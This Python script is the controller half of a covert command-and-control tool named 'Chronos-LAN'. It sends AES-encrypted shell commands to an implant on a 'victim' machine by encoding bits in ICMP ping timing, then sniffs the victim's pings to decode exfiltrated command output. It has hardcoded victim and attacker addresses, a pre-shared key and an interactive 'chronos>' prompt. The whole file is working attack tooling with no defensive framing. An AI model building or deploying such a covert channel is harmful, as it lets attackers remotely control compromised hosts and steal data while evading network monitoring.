#!/usr/bin/env python3
import time
import threading
from scapy.all import ICMP, IP, Raw, sniff, send
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64

# ===== CONFIGURATION =====
VICTIM_IP = "192.168.151.147"  # Victim's IP on the same network
MY_IP = "192.168.151.255"      # Attacker's IP

# AES Encryption - Pre-shared Key (Must match the implant)
KEY = b'thisisasecretkey'  # 16 bytes for AES-128
IV = b'thisisaniv123456'   # 16 bytes

# Timing Configuration (Must match the implant)
SHORT_DELAY = 0.2
LONG_DELAY = 0.5
INTER_PACKET_DELAY = 0.8
JITTER_THRESHOLD = 0.1

# Global variables for receiving
last_rx_time = 0
rx_bit_buffer = ""
rx_capture = False

def aes_encrypt(data):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    return base64.b64encode(ct_bytes).decode()

def aes_decrypt(enc_data):
    ct = base64.b64decode(enc_data)
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt.decode()

def send_timed_ping(target_ip, delay):
    packet = IP(dst=target_ip)/ICMP()/Raw(load="PING")
    send(packet, verbose=False)
    time.sleep(delay)

def send_command_binary(command):
    """Sends a command by encoding it in ping timings."""
    global VICTIM_IP, SHORT_DELAY, LONG_DELAY, INTER_PACKET_DELAY

    print(f"[SENDING CMD] {command}")
    encrypted_cmd = aes_encrypt(command)
    binary_str = ''.join(format(ord(i), '08b') for i in encrypted_cmd)

    # Send START sequence (0101)
    send_timed_ping(VICTIM_IP, SHORT_DELAY)
    time.sleep(INTER_PACKET_DELAY)
    send_timed_ping(VICTIM_IP, LONG_DELAY)
    time.sleep(INTER_PACKET_DELAY)
    send_timed_ping(VICTIM_IP, SHORT_DELAY)
    time.sleep(INTER_PACKET_DELAY)
    send_timed_ping(VICTIM_IP, LONG_DELAY)
    time.sleep(INTER_PACKET_DELAY)

    # Send the command bits
    for bit in binary_str:
        if bit == '0':
            send_timed_ping(VICTIM_IP, SHORT_DELAY)
        else:
            send_timed_ping(VICTIM_IP, LONG_DELAY)
        time.sleep(INTER_PACKET_DELAY)

    # Send STOP sequence (1010)
    send_timed_ping(VICTIM_IP, LONG_DELAY)
    time.sleep(INTER_PACKET_DELAY)
    send_timed_ping(VICTIM_IP, SHORT_DELAY)
    time.sleep(INTER_PACKET_DELAY)
    send_timed_ping(VICTIM_IP, LONG_DELAY)
    time.sleep(INTER_PACKET_DELAY)
    send_timed_ping(VICTIM_IP, SHORT_DELAY)

    print("[+] Command sent.")

def process_icmp_packet(packet):
    """Processes incoming ICMP packets from the victim (exfiltrated data)."""
    global last_rx_time, rx_bit_buffer, rx_capture

    if packet.haslayer(ICMP) and packet[ICMP].type == 8 and packet[IP].src == VICTIM_IP:
        current_time = time.time()
        if last_rx_time == 0:
            last_rx_time = current_time
            return
        time_gap = current_time - last_rx_time
        last_rx_time = current_time

        # Decode the bit
        if abs(time_gap - SHORT_DELAY) < JITTER_THRESHOLD:
            bit = '0'
        elif abs(time_gap - LONG_DELAY) < JITTER_THRESHOLD:
            bit = '1'
        else:
            return

        # Check for start sequence
        if not rx_capture:
            rx_bit_buffer += bit
            if len(rx_bit_buffer) >= 4 and rx_bit_buffer[-4:] == '0101':
                print("[+] Victim started transmitting.")
                rx_capture = True
                rx_bit_buffer = ""
            return

        # Check for stop sequence
        if rx_capture:
            rx_bit_buffer += bit
            if len(rx_bit_buffer) >= 4 and rx_bit_buffer[-4:] == '1010':
                print("[+] Victim finished transmitting.")
                rx_capture = False
                full_binary = rx_bit_buffer[:-4]
                rx_bit_buffer = ""
                try:
                    n = 8
                    bytes_list = [full_binary[i:i+n] for i in range(0, len(full_binary), n) if len(full_binary[i:i+n]) == n]
                    encrypted_str = ''.join(chr(int(byte, 2)) for byte in bytes_list)
                    decrypted_output = aes_decrypt(encrypted_str)
                    print(f"\n[+++ VICTIM OUTPUT +++]\n{decrypted_output}\n[--- END OUTPUT ---]\n")
                except Exception as e:
                    print(f"[-] Decryption error: {e}")
                return

def start_listener():
    """Listens for responses from the victim."""
    print(f"[*] Controller listening for data from {VICTIM_IP}...")
    sniff(filter=f"icmp and host {VICTIM_IP}", prn=process_icmp_packet, store=False)

def main():
    print("[+] Chronos-LAN Controller Active.")
    listener_thread = threading.Thread(target=start_listener)
    listener_thread.daemon = True
    listener_thread.start()

    try:
        while True:
            cmd = input("chronos> ").strip()
            if cmd.lower() in ('exit', 'quit'):
                break
            if cmd:
                send_command_binary(cmd)
            time.sleep(2) # Wait a bit before sending next command
    except KeyboardInterrupt:
        print("\n[!] Shutting down.")

if __name__ == "__main__":
    main()